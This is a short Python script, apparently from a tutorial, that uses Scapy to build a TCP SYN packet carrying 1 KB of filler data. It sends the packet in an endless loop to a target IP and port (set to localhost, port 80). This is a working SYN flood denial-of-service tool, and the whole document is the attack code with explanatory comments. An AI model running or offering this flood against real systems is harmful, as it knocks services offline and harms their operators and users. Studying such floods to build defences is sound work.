from scapy.all import *

target_ip = "127.0.0.1"  # IP address of the target
target_port = 80              # Target port (e.g., HTTP port)

# Craft SYN packet
# Let's forge our SYN packet, starting with IP layer
ip = IP(dst=target_ip)
# Let's forge our TCP layer:
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# Now let's add some flooding raw data to occupy the network (1Kb)
raw = Raw(b"X"*1024)

# now let's stack up the layers and send the packet:
syn_packet = ip / tcp / raw

# Send the constructed packet in a loop until CTRL+C is detected 
send(syn_packet, loop=1, verbose=0)
# So we used send() function that sends packets at layer 3,
# we set loop to 1 to keep sending until we hit CTRL+C,
# setting verbose to 0 will not print anything during the process (silent).